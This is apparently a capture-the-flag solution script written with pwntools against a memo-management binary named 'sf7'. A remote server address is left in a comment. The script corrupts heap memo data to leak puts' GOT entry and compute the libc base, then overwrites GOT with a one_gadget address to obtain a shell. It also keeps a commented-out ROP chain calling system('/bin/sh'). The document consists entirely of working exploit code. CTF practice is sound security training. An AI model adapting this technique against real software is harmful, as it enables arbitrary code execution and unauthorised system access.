from pwn import *

p = process('./sf7')
#p = remote("129.154.197.81", 1800)
e = ELF('./sf7')
# 129.154.197.81:1800


pop_rdi = 0x00000000004010d3

#log
# context.log_level = 'debug'

def create(size, content):
    p.recvuntil("> ")
    p.sendline("1")
    
    p.recvuntil('size : ')
    p.sendline(str(size))
    p.recvuntil("memo : ")
    p.send(content)
    
def show():
    p.recvuntil("> ")
    p.sendline("2")

def modify(old, new):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("memo : ")
    p.send(old)
    p.recvuntil("memo : ")
    p.send(new)
    
def delete(content):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("memo : ")
    p.send(content)

def change(name):
    p.recvuntil("> ")
    p.sendline("5")
    p.recvuntil(" : ")
    p.send(name)

p.recvuntil('name : ')
p.send('leeminjea')

create(0x10, 'A'*8)
create(0x10, 'B'*8)
create(0x10, 'C'*8)

pay = b''
pay += b'B'*0x8 + p64(0)
pay += p64(0) + p64(0x31)
pay += p64(0) + p64(e.got['puts'])
pay += p64(e.got['puts'])

modify('BBBBBBBB\x00', pay)

input()

show()
p.recvuntil("[5]\n")
libc_puts = u64(p.recv(6) + b'\x00\x00')
print(hex(libc_puts))
libc_base = libc_puts - 0x6f6a0
# print(hex(libc_base))
# sys = libc_base + 0x453a0
# binsh = libc_base + 0x18ce57

one = libc_base + 0xf1247

change(p64(libc_puts))  # 

# -----------------------
# pay = b''
# pay += p64(pop_rdi) + p64(binsh)
# pay += p64(sys)
# ----------------------- 


pay = b''
pay += p64(one)

modify(p64(libc_puts), pay)

p.interactive()
